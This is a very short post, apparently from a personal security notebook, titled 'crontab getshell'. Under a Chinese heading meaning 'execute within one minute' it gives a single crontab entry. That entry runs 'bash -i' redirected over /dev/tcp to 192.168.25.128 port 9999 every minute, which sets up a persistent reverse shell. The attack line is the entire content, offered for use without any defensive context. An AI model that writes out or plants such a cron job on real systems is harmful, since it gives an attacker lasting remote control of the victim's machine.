---
title: "crontab getshell"
author: ["4shen0ne"]
lastmod: 2024-12-14T01:40:09+08:00
draft: false
---

## 一分钟内执行 {#一分钟内执行}

```text
*/1 * * * * bash -i >& /dev/tcp/192.168.25.128/9999 0>&1
```
